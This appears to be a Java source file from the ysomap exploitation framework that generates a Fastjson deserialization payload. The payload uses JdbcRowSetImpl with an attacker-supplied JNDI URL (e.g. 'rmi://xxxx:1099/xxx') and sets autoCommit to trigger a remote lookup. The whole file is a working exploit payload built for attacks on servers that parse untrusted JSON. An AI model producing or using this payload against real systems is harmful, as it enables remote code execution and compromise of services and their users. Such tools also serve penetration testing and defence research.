package ysomap.core.gadget.bullet.json;

import ysomap.annotation.Bullets;
import ysomap.annotation.NotNull;
import ysomap.annotation.Require;
import ysomap.core.bean.Bullet;

/**
 * @author wh1t3P1g
 * @since 2020/3/18
 */
@Bullets
public class JdbcRowSetImplJsonBullet extends Bullet<String> {

    @NotNull
    @Require(name = "jndiURL", detail = "jndi lookup url, like rmi://xxxx:1099/xxx")
    public String jndiURL;

    @Override
    public String getObject() {// 由于这里存在autoCommit 不是实际存在的属性，所以这里直接返回字符串
        return "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"xxxx\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":" +
                "\""+ jndiURL +"\",\"autoCommit\":true}}}";
    }
}
